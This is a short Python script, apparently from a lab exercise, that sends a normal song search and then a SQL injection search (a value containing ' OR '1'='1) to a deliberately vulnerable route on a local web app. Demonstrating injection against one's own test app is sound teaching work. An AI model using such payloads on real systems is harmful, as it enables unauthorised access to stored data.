#!/usr/bin/env python3

# Lets this program send HTTP requests to the web app
import requests
# Lets us print readable JSON output 
import json

# The vulnerable route in appRouter.js
URL = "http://localhost:5110/songs/vulnerable-search"

# Sends one song search request to vulnerable backend
def run(song_name):
    # Sends a POST request with the song name as JSON data
    response = requests.post(URL, json={"songName": song_name})
    # Prints the server's JSON response 
    print(json.dumps(response.json(), indent=2))

# runs normal search
print("=== Normal search ===")
run("Video Games")

# runs injected search that changes SQL query meaning
print("\n=== SQL injection search ===")
run("Video Games' OR '1'='1")